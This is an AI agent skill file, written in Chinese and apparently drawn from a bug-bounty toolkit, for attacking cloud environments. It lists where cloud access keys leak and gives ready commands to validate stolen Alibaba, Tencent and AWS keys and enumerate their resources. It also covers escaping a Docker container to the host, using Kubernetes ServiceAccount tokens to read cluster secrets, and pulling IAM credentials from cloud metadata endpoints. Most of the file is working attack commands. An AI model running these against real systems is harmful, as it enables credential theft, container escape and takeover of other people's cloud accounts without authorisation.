---
name: cloud-attack
description: 云攻击——AK/SK泄露利用、对象存储错配、容器逃逸、K8s ServiceAccount。Use when 看到云凭据/OSS/对象存储/容器/K8s/元数据服务。
---

# 云攻击

> 蒸馏自CC挖洞武器库 aksk-cloud-takeover（2026-07实战验证）

## AK/SK 泄露渠道（优先找）

| 渠道 | 搜索 | 优先级 |
|---|---|---|
| Nacos配置 | 默认密钥伪造JWT → 配置泄露 | 🔴 |
| Spring Actuator /env | `oss_access_key_id`/`secret_key`变量 | 🔴 |
| Heapdump | JDumpSpider提取内存AK/SK | 🔴 |
| JS源码 | grep accessKey；搜LTAI/AKID/AKIA | 🟡 |
| Swagger | /api/config返回云凭据 | 🟡 |
| .env泄露 | OSS_ACCESS_KEY_ID=*** | 🟡 |
| APK逆向 | strings app.apk \| grep LTAI | 🟡 |
| Git历史 | org:target "accessKeyId" | 🟡 |

## 三厂商验证命令（拿到AK/SK第一件事）

```bash
# 阿里云（LTAI开头24位）
aliyun configure --access-key-id LTAIxxx --access-key-secret xxx
aliyun sts GetCallerIdentity          # 🔴 第一命——验证有效
aliyun ram ListUsers
aliyun oss ListBuckets                # 列桶
aliyun ecs DescribeInstances          # 列ECS

# 腾讯云（AKID开头）
coscli config -a AKIDxxx -s xxx
coscli ls cos://bucket-name

# AWS（AKIA开头）
export AWS_ACCESS_KEY_ID=AKIAxxx AWS_SECRET_ACCESS_KEY=xxx
aws sts get-caller-identity           # 验证
aws s3 ls                             # 列桶
```

## 对象存储错配（无凭据也可测）

```bash
# 公开桶枚举
curl -s "https://<bucket>.oss-cn-beijing.aliyuncs.com/"       # 阿里
curl -s "https://<bucket>.s3.amazonaws.com/"                  # AWS
curl -s "https://<bucket>.cos.ap-guangzhou.myqcloud.com/"     # 腾讯
# 找敏感文件：backup.zip/.env/config.json/database.sql
```

## 容器逃逸（在容器内）

```bash
# 确认容器
cat /.dockerenv 2>/dev/null; cat /proc/1/cgroup | grep -iE "docker|kubepods"
# Docker socket（经典）
ls -la /var/run/docker.sock && docker -H unix:///var/run/docker.sock ps
docker run -v /:/host -it alpine chroot /host   # 挂载宿主机root
# 特权容器
cat /proc/self/status | grep CapEff   # 0000003fffffffff = 特权
```

## K8s ServiceAccount

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

## 云元数据（SSRF/云内）

```bash
curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/          # AWS
curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s --connect-timeout 3 http://100.100.100.200/latest/meta-data/          # 阿里云
curl -s --connect-timeout 3 http://metadata.tencentyun.com/latest/meta-data/  # 腾讯
```

## 提交要点

- AK/SK验证有效（GetCallerIdentity成功）= 云凭证泄露实锤（中危）
- 能列桶/操作资源 = 危害升级（中危-高危）
- 必须实测，不测不算洞
